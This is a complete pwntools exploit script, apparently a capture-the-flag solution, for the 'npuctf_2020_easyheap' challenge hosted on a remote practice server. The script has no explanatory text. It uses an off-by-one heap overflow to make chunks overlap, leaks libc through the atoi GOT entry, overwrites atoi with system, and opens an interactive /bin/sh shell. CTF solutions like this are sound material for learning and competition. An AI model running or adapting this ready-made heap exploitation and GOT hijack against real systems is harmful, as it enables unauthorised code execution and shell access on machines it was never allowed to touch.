from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('npuctf_2020_easyheap')
io = remote('node4.buuoj.cn', 26960)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc-2.27.so')
elf = ELF('npuctf_2020_easyheap')
atoi_got = elf.got['atoi']


def add(size, content):
    io.sendlineafter('Your choice :', '1')
    io.sendlineafter('Size of Heap(0x10 or 0x20 only) : ', str(size))
    io.sendafter('Content:', content)


def edit(index, content):
    io.sendlineafter('Your choice :', '2')
    io.sendlineafter('Index :', str(index))
    io.sendafter('Content: ', content)


def show(index):
    io.sendlineafter('Your choice :', '3')
    io.sendlineafter('Index :', str(index))


def delete(index):
    io.sendlineafter('Your choice :', '4')
    io.sendlineafter('Index :', str(index))


def leak_libc():
    global libc_base
    add(0x18, 'a\n')
    add(0x18, 'a\n')
    add(0x18, 'a\n')
    edit(0, cyclic(0x18) + p8(0x41))
    delete(1)
    payload = cyclic(0x18) + p64(0x21) + p64(0x38) + p64(atoi_got) + cyclic(8)
    add(0x38, payload)
    show(1)
    io.recvuntil('Content : ')
    libc_base = u64(io.recvn(6).ljust(8, b'\x00')) - libc.sym['atoi']
    log.success('libc_base: ' + hex(libc_base))
    

def pwn():
    system = libc_base + libc.sym['system']
    edit(1, p64(system) + b'\n')
    io.sendlineafter('Your choice :', b'/bin/sh\x00')
    io.interactive()


if __name__ == '__main__':
    leak_libc()
    pwn()
